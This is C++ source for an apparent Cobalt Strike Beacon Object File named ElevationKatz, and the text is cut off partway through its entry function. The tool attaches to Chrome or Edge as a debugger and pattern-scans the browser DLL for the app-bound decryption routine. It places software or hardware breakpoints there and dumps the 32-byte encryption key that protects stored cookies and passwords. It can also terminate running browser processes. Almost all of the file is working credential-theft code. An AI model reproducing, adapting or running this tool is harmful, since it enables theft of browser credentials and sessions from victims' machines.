#include <Windows.h>
#include "base\helpers.h"

/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#include "base\mock.h"
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

extern "C" {
#include "beacon.h"
#include <windows.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <stdio.h>
#include <cstdint>
#pragma comment(lib, "Dbghelp.lib")


    DFR(KERNEL32, GetLastError);
    #define GetLastError KERNEL32$GetLastError 

    #pragma comment(lib,"shlwapi.lib")
    DFR(SHLWAPI, PathFindFileNameW)
    #define PathFindFileNameW  SHLWAPI$PathFindFileNameW

    DFR(KERNEL32, GetModuleHandleW)
    #define GetModuleHandleW KERNEL32$GetModuleHandleW
    DFR(KERNEL32, GetProcAddress)
    #define GetProcAddress KERNEL32$GetProcAddress

    DFR(KERNEL32, OpenThread);
    #define OpenThread KERNEL32$OpenThread
    DFR(KERNEL32, ResumeThread);
    #define ResumeThread KERNEL32$ResumeThread
    DFR(KERNEL32, GetThreadContext)
    #define GetThreadContext KERNEL32$GetThreadContext
    DFR(KERNEL32, SetThreadContext)
    #define SetThreadContext  KERNEL32$SetThreadContext 
    DFR(KERNEL32, GetExitCodeThread)
    #define GetExitCodeThread KERNEL32$GetExitCodeThread

    DFR(KERNEL32, OpenProcess)
    #define OpenProcess KERNEL32$OpenProcess
    DFR(KERNEL32, ReadProcessMemory)
    #define ReadProcessMemory KERNEL32$ReadProcessMemory
    DFR(KERNEL32, WriteProcessMemory)
    #define WriteProcessMemory KERNEL32$WriteProcessMemory
    DFR(KERNEL32, TerminateProcess);
    #define TerminateProcess KERNEL32$TerminateProcess
    DFR(KERNEL32, CloseHandle)
    #define CloseHandle KERNEL32$CloseHandle

    DFR(KERNEL32, CreateToolhelp32Snapshot)
    #define CreateToolhelp32Snapshot KERNEL32$CreateToolhelp32Snapshot
    DFR(KERNEL32, Process32FirstW)
    #define Process32FirstW KERNEL32$Process32FirstW
    DFR(KERNEL32, Process32NextW)
    #define Process32NextW KERNEL32$Process32NextW

    DFR(MSVCRT, _wcsicmp)
    #define _wcsicmp MSVCRT$_wcsicmp
    DFR(MSVCRT, _stricmp);
    #define _stricmp MSVCRT$_stricmp
    DFR(MSVCRT, wcslen)
    #define wcslen MSVCRT$wcslen
    DFR(MSVCRT, memcpy)
    #define memcpy MSVCRT$memcpy
    DFR(MSVCRT, memcpy_s)
    #define memcpy_s MSVCRT$memcpy_s
    DFR(MSVCRT, memcmp)
    #define memcmp MSVCRT$memcmp
    DFR(MSVCRT, malloc)
    #define malloc MSVCRT$malloc
    DFR(MSVCRT, free)
    #define free MSVCRT$free

    //Due to wcscpy_s overloads, this won't work. In BOF we use memcpy instead
    //DFR(MSVCRT, wcscpy_s)
    //#define wcscpy_s MSVCRT$wcscpy_s

#pragma region HWBreakpoint

    typedef NTSTATUS(NTAPI* NtGetNextThread)(
        HANDLE ProcessHandle,
        HANDLE ThreadHandle,
        ACCESS_MASK DesiredAccess,
        ULONG HandleAttributes,
        ULONG Flags,
        PHANDLE NewThreadHandle);

#define STATUS_NO_MORE_ENTRIES           ((NTSTATUS)0x8000001AL)
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

    BOOL SetHWBreakPoint(HANDLE hThread, DWORD64 addr)
    {
        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        if (!GetThreadContext(hThread, &ctx)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to acquire Thread Context. Error: %d\n", GetLastError());
            return false;
        }

        // Set break point to Debug Register #0
        ctx.Dr0 = addr;

        //Clear before resetting
        ctx.Dr7 = 0;

        // Enable slot #0
        ctx.Dr7 |= (1ull << 0);

        // Clear status
        ctx.Dr6 = 0;

        return SetThreadContext(hThread, &ctx);
    }

    BOOL SetHWBPOnThread(HANDLE hThread, uintptr_t bpAddress) {
        DFR_LOCAL(KERNEL32, SuspendThread)
        DFR_LOCAL(KERNEL32, GetThreadId)
        if (SuspendThread(hThread) == ((DWORD)-1)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to suspend Thread: %d, Error: %d\n", GetThreadId(hThread), GetLastError());
            return FALSE;
        }

        if (!SetHWBreakPoint(hThread, bpAddress)) //Continue on error
            BeaconPrintf(CALLBACK_ERROR, "Failed to set HW breakpoint on Thread: %d, Error: %d\n", GetThreadId(hThread), GetLastError());

        if (ResumeThread(hThread) == ((DWORD)-1)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to resume Thread: %d, Error: %d\n", GetThreadId(hThread), GetLastError());
            return FALSE;
        }

        return TRUE;
    }

    BOOL SetOnAllThreads(HANDLE hProcess, uintptr_t bpAddr) {
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (!ntdll)
        {
            BeaconPrintf(CALLBACK_ERROR, "Failed to get module handle for NTDLL.dll, Error: %d\n", GetLastError());
            return FALSE;
        }
        NtGetNextThread pNtGetNextThread = reinterpret_cast<NtGetNextThread>(GetProcAddress(ntdll, "NtGetNextThread"));
        if (!pNtGetNextThread) {
            BeaconPrintf(CALLBACK_ERROR, "Could not find function address for NtGetNextThread\n");
            return FALSE;
        }

        HANDLE hThread = nullptr;
        for (;;) {
            HANDLE hNextThread = nullptr;
            NTSTATUS st = pNtGetNextThread(hProcess, hThread, THREAD_ALL_ACCESS, 0, 0, &hNextThread);
            if (!NT_SUCCESS(st)) {

                if (hThread)
                    CloseHandle(hThread);

                if (st != STATUS_NO_MORE_ENTRIES) {
                    BeaconPrintf(CALLBACK_ERROR, "NtGetNextThread failed with error: %d\n", GetLastError());
                    return FALSE;
                }
                return TRUE;
            }

            if (SetHWBPOnThread(hNextThread, bpAddr)) {
#ifdef _DEBUG
                BeaconPrintf(CALLBACK_OUTPUT, "HW breakpoint set on Thread: %d\n", GetThreadId(hNextThread));
#endif // _DEBUG

            }

            //Close old handle
            if (hThread)
                CloseHandle(hThread);

            hThread = hNextThread;
        }

        if (hThread)
            CloseHandle(hThread);

        return TRUE;
    }

    BOOL SetOnAllThreadsTL32(DWORD pid, uintptr_t addr) {
        DFR_LOCAL(KERNEL32, Thread32First);
        DFR_LOCAL(KERNEL32, Thread32Next)
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (snap == INVALID_HANDLE_VALUE) {
            BeaconPrintf(CALLBACK_ERROR, "CreateToolhelp32Snapshot failed, Error: %d\n", GetLastError());
            return FALSE;
        }

        THREADENTRY32 te = { sizeof(THREADENTRY32) };
        if (!Thread32First(snap, &te))
        {
            BeaconPrintf(CALLBACK_ERROR, "Thread32First failed, Error: %d\n", GetLastError());
            return FALSE;
        }

        do {
            if (te.th32OwnerProcessID != pid)
                continue;

            HANDLE th = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
            if (!th) {
                BeaconPrintf(CALLBACK_ERROR, "Failed to open Thread: %d, Error: %d\n", te.th32ThreadID, GetLastError());
                return FALSE;
            }

            //We already notify on errors elsewhere, just have debug output here
            if (SetHWBPOnThread(th, addr))
                BeaconPrintf(CALLBACK_OUTPUT, "HW breakpoint set on Thread: %d\n", te.th32ThreadID);

            CloseHandle(th);
        } while (Thread32Next(snap, &te));

        CloseHandle(snap);
        return TRUE;
    }

#pragma endregion

    BOOL FindAndTerminateProcess(wchar_t* processName) {

        HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hProcessSnap == INVALID_HANDLE_VALUE)
        {
            BeaconPrintf(CALLBACK_ERROR, "CreateToolhelp32Snapshot failed, Error: %d\n", GetLastError());
            return FALSE;
        }

        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);

        if (!Process32FirstW(hProcessSnap, &pe32))
        {
            BeaconPrintf(CALLBACK_ERROR, "Process32First failed, Error: % d\n", GetLastError());
            CloseHandle(hProcessSnap);
            return FALSE;
        }

        do
        {
            if (_wcsicmp(pe32.szExeFile, processName) == 0)
            {
                HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);

                if (!TerminateProcess(hParent, 0)) {
#ifdef _DEBUG
                    //This is expected as ususally the parent process gets terminated first and the rest no longer exist, causing Error: 5.
                    BeaconPrintf(CALLBACK_ERROR, "Failed to kill process: %d, Error: %d\n", pe32.th32ParentProcessID, GetLastError());
#endif
                }
                else
                    BeaconPrintf(CALLBACK_OUTPUT, "Terminated existing % ls process pid : % d, Error : % d\n", processName, pe32.th32ParentProcessID, GetLastError());

                CloseHandle(hParent);
            }

        } while (Process32NextW(hProcessSnap, &pe32));

        CloseHandle(hProcessSnap);

        return TRUE;
    }

    BOOL FindSectionHeader(HANDLE hProcess, uintptr_t moduleBase, const char* targetSection, IMAGE_SECTION_HEADER* section) {
        IMAGE_DOS_HEADER dos = { 0 };
        IMAGE_NT_HEADERS64 nt = { 0 };

        size_t read = 0;
        if (!ReadProcessMemory(hProcess, (LPCVOID)moduleBase, &dos, sizeof(IMAGE_DOS_HEADER), &read)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to read DLL DOS header. Error: %d\n", GetLastError());
            return FALSE;
        }
        read = 0;
        if (!ReadProcessMemory(hProcess, (LPCVOID)(moduleBase + dos.e_lfanew), &nt, sizeof(IMAGE_NT_HEADERS64), &read)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to read DLL NT header. Error: %d\n", GetLastError());
            return FALSE;
        }
        read = 0;

        for (int i = 0; i < nt.FileHeader.NumberOfSections; i++) {
            int offset = (dos.e_lfanew + sizeof(IMAGE_NT_HEADERS64)) + (i * sizeof(IMAGE_SECTION_HEADER));

            IMAGE_SECTION_HEADER sectionHeader = { 0 };
            if (!ReadProcessMemory(hProcess, (LPCVOID)(moduleBase + offset), &sectionHeader, sizeof(IMAGE_SECTION_HEADER), &read)) {
                BeaconPrintf(CALLBACK_ERROR, "Failed to read Section header: %d. Error: %d\n", i, GetLastError());
                continue; //Too bad, continue to the next
            }
            else {
                //We are only interested in short section names, so this is fine
                char name[9] = { 0 };
                memcpy(name, sectionHeader.Name, 8);

                if (_stricmp(name, targetSection) == 0) {

                    uintptr_t sectionBase = moduleBase + sectionHeader.VirtualAddress;
                    DWORD sectionSize = sectionHeader.Misc.VirtualSize ? sectionHeader.Misc.VirtualSize : sectionHeader.SizeOfRawData;

                    memcpy_s(section, sizeof(IMAGE_SECTION_HEADER), &sectionHeader, sizeof(IMAGE_SECTION_HEADER));

                    BeaconPrintf(CALLBACK_OUTPUT, "Found target secion: %s, Base address: 0x%016llx, Size: %d\n", name, sectionBase, sectionSize);
                    return TRUE;
                }
            }
            read = 0;
        }

        return FALSE;
    }

    uintptr_t FindXREF(HANDLE hProcess, uintptr_t moduleBaseAddr, uintptr_t targetAddress) {

        IMAGE_SECTION_HEADER sectionHeader = { 0 };
        if (!FindSectionHeader(hProcess, moduleBaseAddr, ".text", &sectionHeader)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to get .text section header.\n");
            return 0;
        }

        uintptr_t sectionBase = moduleBaseAddr + sectionHeader.VirtualAddress;
        DWORD sectionSize = sectionHeader.Misc.VirtualSize ? sectionHeader.Misc.VirtualSize : sectionHeader.SizeOfRawData;

        BYTE* buffer = (BYTE*)malloc(sectionSize);
        SIZE_T bytesRead;

        //Might be smarter to read the memory in blocks rather than try to take it all, but well... 
        if (ReadProcessMemory(hProcess, (LPCVOID)sectionBase, buffer, sectionSize, &bytesRead)) {

            /*
            * Scanning for our XREF, this one requires bit of explaining..
            * In Ghidra the bytes are: 48 8D 0D 3F 9B FC 05
            * Which matches instruction:
            *   LEA  RCX,[s_OSCrypt.AppBoundProvider.Decrypt_18db0d]
            *
            * Byte by byte explanation is:
            * 48 = REX.W
            * 8D = LEA
            * 0D = ModRM(Mod = 00, Reg = 001 -> RCX, R / M = 101 -> RIP - rel)
            * 3F 9B FC 05 = disp32 = 0x05FC9B3F
            *
            * And to come up for the value 0x05FC9B3F,
            * we will need to calculate it during our scan, as it is relative
            */

            size_t instrLen = 7; // rex + opcode + modrm + disp32
            for (size_t i = 0; i + instrLen <= bytesRead;) {
                size_t p = i;

                // REX.W
                if (buffer[p++] != 0x48) {
                    i++; continue;
                }
                // LEA
                if (buffer[p++] != 0x8D) {
                    i++; continue;
                }
                // ModRM
                if (buffer[p++] != 0x0D) {
                    i++; continue;
                }

                int32_t disp;
                memcpy(&disp, buffer + p, 4);
                p += 4;

                uint64_t instrVA = (uint64_t)sectionBase + i;
                uint64_t target = instrVA + instrLen + (int64_t)disp;

                if (target == targetAddress) {
                    uintptr_t address = (sectionBase + i);
                    BeaconPrintf(CALLBACK_OUTPUT, " Found target XREF at: 0x%016llx, Section: 0x%016llx, Offset:  0x%Ix\n", address, sectionBase, i);
                    free(buffer);
                    return address;
                }
                i++;
            }
        }
        else {
            BeaconPrintf(CALLBACK_ERROR, "ReadProcessMemory failed to read the section 0x%016llx Error: %lu\n", sectionBase, GetLastError());
        }

        BeaconPrintf(CALLBACK_ERROR, "Failed to find the pattern in 0x%016llx section.\n", sectionBase);
        free(buffer);
        return 0;
    }

    uintptr_t FindPattern(HANDLE hProcess, uintptr_t moduleBaseAddr, BYTE* pattern, size_t patternLen) {

        IMAGE_SECTION_HEADER sectionHeader = { 0 };
        if (!FindSectionHeader(hProcess, moduleBaseAddr, ".rdata", &sectionHeader)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to get .rdata section header.\n");
            return 0;
        }

        uintptr_t sectionBase = moduleBaseAddr + sectionHeader.VirtualAddress;
        DWORD sectionSize = sectionHeader.Misc.VirtualSize ? sectionHeader.Misc.VirtualSize : sectionHeader.SizeOfRawData;

        BYTE* buffer = (BYTE*)malloc(sectionSize);
        SIZE_T bytesRead;
        //Might be smarter to read the memory in blocks rather than try to take it all, but well... 
        if (ReadProcessMemory(hProcess, (LPCVOID)sectionBase, buffer, sectionSize, &bytesRead)) {
            for (size_t i = 0; i <= bytesRead - patternLen; ++i) {
                if (memcmp(buffer + i, pattern, patternLen) == 0) {
                    uintptr_t resultAddress = sectionBase + i;
                    BeaconPrintf(CALLBACK_OUTPUT, "Found pattern on Address : 0x % 016llx, Section base : 0x % 016llx, Offset: 0x % Ix\n", resultAddress, sectionBase, i);
                    free(buffer);
                    return resultAddress;
                }
            }
        }
        else {
            BeaconPrintf(CALLBACK_ERROR, "ReadProcessMemory failed to read the section 0x%016llx Error: %lu\n", sectionBase, GetLastError());
        }

        BeaconPrintf(CALLBACK_ERROR, "Failed to find the pattern in 0x%016llx section.\n", sectionBase);
        free(buffer);
        return 0;
    }

    void ToHex(const BYTE* in, size_t len, char* out) {
        static const char* digits = "0123456789ABCDEF";

        for (size_t i = 0; i < len; ++i) {
            BYTE b = in[i];
            out[2 * i] = digits[b >> 4];
            out[2 * i + 1] = digits[b & 0x0F];
        }
        out[2 * len] = '\0';
    }

    void PrintKey(HANDLE hProc, uintptr_t registryAddr) {
        SIZE_T n = 0;
        uintptr_t address = 0;
        if (!ReadProcessMemory(hProc, (LPCVOID)registryAddr, &address, sizeof(uintptr_t), &n)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to read contents of R14, Error: %lu\n", GetLastError());
            return;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "Encryption key will be at 0x%016llx\n", (unsigned long long)address);

        n = 0;
        const int keyLen = 32;
        BYTE key[keyLen] = { 0 };
        if (!ReadProcessMemory(hProc, (LPCVOID)address, &key, keyLen, &n)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to read the key from address : 0x%016llx, Error: %lu\n", (unsigned long long)address, GetLastError());
            return;
        }

        char keyHex[keyLen * 2 + 1];
        ToHex(key, keyLen, keyHex);

        BeaconPrintf(CALLBACK_OUTPUT, " Got key: %s \n", keyHex);
    }

    void DumpSecret(HANDLE hProc, HANDLE hThread, BOOL edge) {
        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL | CONTEXT_SEGMENTS;

        if (!GetThreadContext(hThread, &ctx)) {
            BeaconPrintf(CALLBACK_OUTPUT, "GetThreadContext failed: %lu\n", GetLastError());
            CloseHandle(hThread);
            return;
        }
#ifdef _DEBUG
        BeaconPrintf(CALLBACK_OUTPUT, "Registry contents:\n");
        BeaconPrintf(CALLBACK_OUTPUT, "    RAX=%llx RBX=%llx RCX=%llx RDX=%llx\n", ctx.Rax, ctx.Rbx, ctx.Rcx, ctx.Rdx);
        BeaconPrintf(CALLBACK_OUTPUT, "    RSI=%llx RDI=%llx RBP=%llx RSP=%llx\n", ctx.Rsi, ctx.Rdi, ctx.Rbp, ctx.Rsp);
        BeaconPrintf(CALLBACK_OUTPUT, "    R8 =%llx R9 =%llx R10=%llx R11=%llx\n", ctx.R8, ctx.R9, ctx.R10, ctx.R11);
        BeaconPrintf(CALLBACK_OUTPUT, "    R12=%llx R13=%llx R14=%llx R15=%llx\n", ctx.R12, ctx.R13, ctx.R14, ctx.R15);
        BeaconPrintf(CALLBACK_OUTPUT, "    RIP=%llx EFLAGS=%08lx\n", ctx.Rip, ctx.EFlags);
#endif // _DEBUG

        if (ctx.R14 == 0)
        {
            BeaconPrintf(CALLBACK_ERROR, "R14 registry was empty\n");
            return;
        }

        if (edge && ctx.Rbx == 0)
        {
            BeaconPrintf(CALLBACK_ERROR, "RBX registry was empty\n");
            return;
        }

        if (edge)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "Dumping key from RBX\n");
            PrintKey(hProc, ctx.Rbx);
        }
        else {
            BeaconPrintf(CALLBACK_OUTPUT, "Dumping key from R14\n");
            PrintKey(hProc, ctx.R14);
        }
    }

    BOOL GetModuleName(HANDLE hProcess, const void* remote, wchar_t* dllName) {

        SIZE_T read = 0;
        wchar_t bufferW[1024] = { 0 };
        if (!ReadProcessMemory(hProcess, remote, bufferW, sizeof(bufferW) - sizeof(wchar_t), &read)) {
            int lastError = GetLastError();
            if (lastError != 299) { //NTDLL etc will cause this error, but we don't care about that
                BeaconPrintf(CALLBACK_ERROR, "GetModuleName: ReadProcessMemory failed to read the unicode string. Error: %d\n", lastError);
                return FALSE;
            }
        }
        bufferW[read / sizeof(wchar_t)] = L'\0';

        const wchar_t* moduleName = PathFindFileNameW(bufferW);
        size_t moduleNameLen = wcslen(moduleName) * sizeof(wchar_t);
        memcpy_s(dllName, MAX_PATH, moduleName, moduleNameLen + sizeof(wchar_t));

        return TRUE;
    }

    BOOL SetBreakPoint(HANDLE hProcess, uintptr_t breakpointAddress) {

        BYTE breakpointByte = 0xCC; // INT 3
        if (WriteProcessMemory(hProcess, (LPVOID)breakpointAddress, &breakpointByte, sizeof(BYTE), nullptr)) {
            BeaconPrintf(CALLBACK_OUTPUT, "Breakpoint set successfully at address: 0x%016llx\n", breakpointAddress);
        }
        else {
            BeaconPrintf(CALLBACK_ERROR, "Failed to set breakpoint at address: 0x%016llx, Error: %d\n", breakpointAddress, GetLastError());
            return FALSE;
        }

        return TRUE;
    }

    void DebugProcess(HANDLE hProcess, HANDLE hThread, const wchar_t* targetModule, DWORD waitTime, BOOL useHW, BOOL useTL32) {
        DEBUG_EVENT debugEvent;
        uintptr_t breakpointAddress = 0x00;

        DFR_LOCAL(KERNEL32, WaitForDebugEvent);
        DFR_LOCAL(KERNEL32, ContinueDebugEvent);

        while (WaitForDebugEvent(&debugEvent, waitTime)) {
            switch (debugEvent.dwDebugEventCode) {
            case EXCEPTION_DEBUG_EVENT: {
                EXCEPTION_RECORD exceptionRecord = debugEvent.u.Exception.ExceptionRecord;

                // Uncomment this and you will know why it is commented out even on debug builds
                //BeaconPrintf(CALLBACK_OUTPUT, "Exception occurred at address: 0x%llx", exceptionRecord.ExceptionAddress);

                if (useHW && breakpointAddress != 0)
                {
                    if (debugEvent.dwDebugEventCode == EXCEPTION_DEBUG_EVENT &&
                        debugEvent.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP) {

                        HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, debugEvent.dwThreadId);
                        if (!hThread) {
                            BeaconPrintf(CALLBACK_ERROR, "Failed to open Thread: %d, Error: %d\n", debugEvent.dwThreadId, GetLastError());

                            ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
                            return;
                        }

                        CONTEXT c = { 0 };
                        c.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;

                        GetThreadContext(hThread, &c);

                        BeaconPrintf(CALLBACK_OUTPUT, " Hit HW breakpoint Execute at slot 0: RIP=0x%016llx\n", (unsigned long long)c.Rip);

                        if (_wcsicmp(targetModule, L"msedge.dll") == 0)
                            DumpSecret(hProcess, hThread, TRUE);
                        else
                            DumpSecret(hProcess, hThread, FALSE);
                        

                        CloseHandle(hThread);

                        ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
                        return;
                    }
                }
                else {
                    // Check if the hit breakpoint is the one we set
                    if (!useHW && exceptionRecord.ExceptionAddress == (LPCVOID)breakpointAddress) {
                        BeaconPrintf(CALLBACK_OUTPUT, " Thread: %d hit the breakpoint at: 0x%p\n", debugEvent.dwThreadId, exceptionRecord.ExceptionAddress);

                        HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, debugEvent.dwThreadId);
                        if (hThread) {
                            DWORD exitCode;
                            if (GetExitCodeThread(hThread, &exitCode)) {
                                if (exitCode == STILL_ACTIVE) {
                                    if (_wcsicmp(targetModule, L"msedge.dll") == 0)
                                        DumpSecret(hProcess, hThread, TRUE);
                                    else
                                        DumpSecret(hProcess, hThread, FALSE);
                                }
                                else
                                    BeaconPrintf(CALLBACK_ERROR, "Thread %d has already exited. Exit code: %d\n", debugEvent.dwThreadId, exitCode);
                            }
                            else
                                BeaconPrintf(CALLBACK_ERROR, "Failed to get Thread %d exit code. Error: %d\n", debugEvent.dwThreadId, GetLastError());

                            CloseHandle(hThread);
                        }
                        else {
                            BeaconPrintf(CALLBACK_ERROR, "Failed to open Thread: %d. Error: %d\n", debugEvent.dwThreadId, GetLastError());
                        }

                        return;
                    }
                }
                break;
            }
            case CREATE_THREAD_DEBUG_EVENT:
                if (useHW && breakpointAddress != 0) {
                    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, debugEvent.dwThreadId);
                    if (!hThread) {
                        BeaconPrintf(CALLBACK_ERROR, "Failed to open Thread: %d, Error: %d\n", debugEvent.dwThreadId, GetLastError());
                        break;
                    }
                    if (SetHWBPOnThread(hThread, breakpointAddress)) {
#ifdef _DEBUG
                        BeaconPrintf(CALLBACK_OUTPUT, "HW breakpoint set on new Thread: % d\n", debugEvent.dwThreadId);
#endif // _DEBUG

                    }

                    CloseHandle(hThread);
                }
                break;
            case CREATE_PROCESS_DEBUG_EVENT:
                break;
            case EXIT_THREAD_DEBUG_EVENT:
                break;
            case EXIT_PROCESS_DEBUG_EVENT:
                BeaconPrintf(CALLBACK_OUTPUT, " EXIT_PROCESS_DEBUG_EVENT\n");
                BeaconPrintf(CALLBACK_OUTPUT, " Process exited. Exiting debug loop.\n");
                return; // Exit the loop and end debugging
            case LOAD_DLL_DEBUG_EVENT: {

                //already set the breakpoint
                if (breakpointAddress != 0)
                    break;

                // Identify chrome.dll when it loads
                if (debugEvent.u.LoadDll.lpImageName) {
                    PVOID namePtrInTarget = debugEvent.u.LoadDll.lpImageName;

                    PVOID strPtr = nullptr;
                    SIZE_T rb = 0;
                    if (!ReadProcessMemory(hProcess, namePtrInTarget, &strPtr, sizeof(strPtr), &rb) && strPtr) {
                        BeaconPrintf(CALLBACK_ERROR, "Failed to read DLL name from address: 0x%p. Error: %d\n", namePtrInTarget, GetLastError());
                    }
                    wchar_t DllName[MAX_PATH];
                    if (!GetModuleName(hProcess, strPtr, DllName)) {
                        BeaconPrintf(CALLBACK_ERROR, "Failed to parse DLL name from the remote process.\n");
                        break;
                    }

                    if (_wcsicmp(targetModule, DllName) == 0)
                    {
                        LPVOID chromeDllBase = debugEvent.u.LoadDll.lpBaseOfDll;

                        BeaconPrintf(CALLBACK_OUTPUT, "%ls loaded at 0x%p\n", targetModule, chromeDllBase);

                        //OSCrypt.AppBoundProvider.Decrypt.ResultCode
                        BYTE stringPattern[] = {
                            0x4f,0x53,0x43,0x72,0x79,0x70,0x74,0x2e,0x41,0x70,0x70,0x42,0x6f,0x75,0x6e,0x64,
                            0x50,0x72,0x6f,0x76,0x69,0x64,0x65,0x72,0x2e,0x44,0x65,0x63,0x72,0x79,0x70,0x74,
                            0x2e,0x52,0x65,0x73,0x75,0x6c,0x74,0x43,0x6f,0x64,0x65,0x00
                        };
                        size_t szStringPattern = 44;

                        uintptr_t result = FindPattern(hProcess, reinterpret_cast<uintptr_t>(chromeDllBase), stringPattern, szStringPattern);
                        if (result == 0)
                        {
                            BeaconPrintf(CALLBACK_ERROR, "Failed to find the first pattern.\n");
                            return;
                        }

                        BeaconPrintf(CALLBACK_OUTPUT, "Found first pattern on address: 0x%016llx\n", result);

                        breakpointAddress = FindXREF(hProcess, reinterpret_cast<uintptr_t>(chromeDllBase), result);
                        if (breakpointAddress == 0)
                        {
                            BeaconPrintf(CALLBACK_ERROR, "Failed to find the second pattern.\n");
                            return;
                        }

                        BeaconPrintf(CALLBACK_OUTPUT, "Found second pattern on address: 0x%016llx\n", breakpointAddress);

                        if (useHW)
                        {
                            if (useTL32)
                            {
                                if (!SetOnAllThreadsTL32(debugEvent.dwProcessId, breakpointAddress)) {
                                    BeaconPrintf(CALLBACK_ERROR, "Failed to set HW breakpoints!\n");
                                    ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
                                    return;
                                }
                            }
                            else {
                                if (!SetOnAllThreads(hProcess, breakpointAddress)) {
                                    BeaconPrintf(CALLBACK_ERROR, "Failed to set HW breakpoints!\n");
                                    return;
                                }
                            }
                        }
                        else {
                            if (!SetBreakPoint(hProcess, breakpointAddress)) {
                                BeaconPrintf(CALLBACK_ERROR, "Failed to set the breakpoint.\n");
                                return;
                            }
                        }
                    }
                }
            }
                                     break;
            case UNLOAD_DLL_DEBUG_EVENT:
                break;
            case OUTPUT_DEBUG_STRING_EVENT:
                break;
            case RIP_EVENT:
                break;
            default:
                break;
            }
            ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
        }
    }

    void banner() {
        BeaconPrintf(CALLBACK_OUTPUT, "______ _                 _   _             _  __     _        \n");
        BeaconPrintf(CALLBACK_OUTPUT, "|  ____| |               | | (_)           | |/ /    | |       \n");
        BeaconPrintf(CALLBACK_OUTPUT, "| |__  | | _____   ____ _| |_ _  ___  _ __ | ' / __ _| |_ ____ \n");
        BeaconPrintf(CALLBACK_OUTPUT, "|  __| | |/ _ \\ \\ / / _` | __| |/ _ \\| '_ \\|  < / _` | __|_  / \n");
        BeaconPrintf(CALLBACK_OUTPUT, "| |____| |  __/\\ V / (_| | |_| | (_) | | | | . \\ (_| | |_ / /  \n");
        BeaconPrintf(CALLBACK_OUTPUT, "|______|_|\\___| \\_/ \\__,_|\\__|_|\\___/|_| |_|_|\\_\\__,_|\\__/___| \n");
        BeaconPrintf(CALLBACK_OUTPUT, "By Meckazin                                github.com/Meckazin \n");
    }

    void go(char* args, int len) {

        BOOL useHW = FALSE;
        BOOL useTL32 = FALSE;
        BOOL terminate = FALSE;
        DWORD wait = 500; //Default wait time 500ms

        wchar_t* targetModule = L"";
        wchar_t* targetExecutable = L"";

#ifndef _WIN64
        BeaconPrintf(CALLBACK_OUTPUT, "32bit version is not currently supported.\n");
        return 1;
#endif // !_WIN64

        datap parser = { 0 };
        BeaconDataParse(&parser, args, len);
        if (parser.original == 0)
        {
            BeaconPrintf(CALLBACK_ERROR, "Missing mandatory argument /chrome, /edge or /path and /module\n");
            return;
        }
        
        char* browser = BeaconDataExtract(&parser, NULL);
        terminate = (BOOL)BeaconDataShort(&parser);
        useHW = (BOOL)BeaconDataShort(&parser);
        useTL32 = (BOOL)BeaconDataShort(&parser);
        wait = (DWORD)BeaconDataInt(&parser);
        const wchar_t* executable = (wchar_t*)BeaconDataExtract(&parser, NULL);
        const wchar_t* module = (wchar_t*)BeaconDataExtract(&parser, NULL);

        if (_stricmp(browser, "chrome") == 0)
        {
            targetModule = L"chrome.dll";
            targetExecutable = L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
        }
        else if (_stricmp(browser, "edge") == 0)
        {
            targetModule = L"msedge.dll";
            targetExecutable = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
        }

        if (wcslen(module) > 0) {
            size_t moduleLen = wcslen(module) * sizeof(wchar_t);
            memcpy_s(targetModule, MAX_PATH, module, moduleLen + sizeof(wchar_t));
        }

        if (wcslen(executable) > 0) {
            size_t executableLen = wcslen(executable) * sizeof(wchar_t);
            memcpy_s(targetExecutable, MAX_PATH, executable, executableLen + sizeof(wchar_t));
        }

        //This is important
        banner();
        BeaconPrintf(CALLBACK_OUTPUT, "How am I supposed to use the key though?\n\n");

        if (targetModule == L"" || targetExecutable == L"")
        {
            BeaconPrintf(CALLBACK_ERROR, "Flags /Edge, /Chrome or /Path and /Module are reqruired\n");
            return;
        }

        if (terminate)
        {
            wchar_t* executableName = PathFindFileNameW(targetExecutable);
            FindAndTerminateProcess(executableName);
        }

        //For BOFs the INFINITE wait time is not an option
        if (wait == 0)
            wait = 500;

        STARTUPINFOW si = { sizeof(si) };
